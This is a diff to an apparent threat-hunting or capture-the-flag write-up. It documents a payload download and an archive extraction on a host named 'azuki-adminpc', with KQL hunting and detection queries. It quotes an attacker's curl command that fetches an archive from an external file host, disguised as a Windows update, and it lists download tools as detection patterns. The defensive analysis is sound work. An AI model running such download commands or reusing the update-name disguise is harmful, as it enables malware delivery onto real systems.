@@ -272,9 +272,9 @@ DeviceNetworkEvents
 ```
 
 
-### 🚩 Flag # – [Flag Title]
+### 🚩 Flag #5: EXECUTION - Malware Download Command
 **🎯 Objective**  
-[Describe the objective of this flag in 1-2 sentences.]
+Command-line download utilities provide flexible, scriptable malware delivery while blending with legitimate administrative activity.
 
 **📌 Finding**  
 [Your finding/answer here, e.g., specific command or artifact.]
@@ -283,25 +283,39 @@ DeviceNetworkEvents
 
 | Field            | Value                                      |
 |------------------|--------------------------------------------|
-| Host             | [e.g., victim-vm]                          |
-| Timestamp        | [e.g., 2025-12-11T12:00:00Z]               |
-| Process          | [e.g., powershell.exe]                     |
-| Parent Process   | [e.g., explorer.exe]                       |
-| Command Line     | `[Your command line here]`                 |
+| Host             | azuki-adminpc                         |
+| Timestamp        | Nov 25, 2025 11:21:11 AM              |
+| Process          | curl.exe                   |
+| Parent Process   | explorer.exe                      |
+| Command Line     | `"curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z`                 |
 
 **💡 Why it matters**  
-[Explain the impact, real-world relevance, MITRE mapping, and why this is a high-signal indicator. 4-6 sentences for depth.]
+The attacker used a command-line tool (curl) to directly download a malicious archive disguised as a legitimate Windows update (KB5044273-x64.7z).
+This technique lets attackers quickly pull payloads from external hosting sites while blending in with normal admin or update activity.
+Spotting these scripted downloads early is key because they are often the moment malware first lands on the system, enabling everything that follows (MITRE ATT&CK T1105 – Ingress Tool Transfer).
 
 **🔧 KQL Query Used**
 ```
-[Your exact KQL query here]
+DeviceProcessEvents
+| where Timestamp between (startofday(date(2025-11-24)) .. endofday(date(2025-11-25)))
+| where DeviceName has "azuki"
+| where ProcessCommandLine  has_any("powershell", "python", "curl", "wget", "certutil")
+| project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessParentFileName
+| order by Timestamp asc 
 ```
 **🖼️ Screenshot**
-[Your screenshot here]
+<img width="1733" height="563" alt="image" src="https://github.com/user-attachments/assets/4c6273f0-42c1-4ccc-a224-317e7a8af9e4" />
+
 
 **🛠️ Detection Recommendation**
 ```
-[Your exact KQL query here]
+DeviceProcessEvents
+| where Timestamp > ago(30d)                              // Adjust time window as needed
+| where FileName in ("curl.exe", "wget.exe", "bitsadmin.exe", "certutil.exe", "powershell.exe")
+| where ProcessCommandLine has_any("-o ", "/o ", "-out", "OutFile", "download", "Invoke-WebRequest", "Start-BitsTransfer", "certutil -urlcache")
+| where ProcessCommandLine has_any("http://", "https://", ".exe", ".zip", ".7z", ".ps1", ".dll")
+| project Timestamp, DeviceName, ProcessCommandLine, FileName, AccountName, InitiatingProcessCommandLine
+| order by Timestamp desc
 ```
 
 
@@ -311,9 +325,9 @@ DeviceNetworkEvents
 <br>
 
 
-### 🚩 Flag # – [Flag Title]
+### 🚩 Flag #6: EXECUTION - Archive Extraction Command
 **🎯 Objective**  
-[Describe the objective of this flag in 1-2 sentences.]
+Password-protected archives evade basic content inspection while legitimate compression tools bypass application whitelisting controls.
 
 **📌 Finding**  
 [Your finding/answer here, e.g., specific command or artifact.]
@@ -333,10 +347,16 @@ DeviceNetworkEvents
 
 **🔧 KQL Query Used**
 ```
-[Your exact KQL query here]
+DeviceProcessEvents
+| where Timestamp between (startofday(date(2025-11-24)) .. endofday(date(2025-11-25)))
+| where DeviceName has "azuki"
+| project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessParentFileName
+| order by Timestamp asc 
+
 ```
 **🖼️ Screenshot**
-[Your screenshot here]
+<img width="1854" height="443" alt="image" src="https://github.com/user-attachments/assets/16f91eeb-d0c5-40a3-a0cc-00e4b89967ce" />
+
 
 **🛠️ Detection Recommendation**
 ```
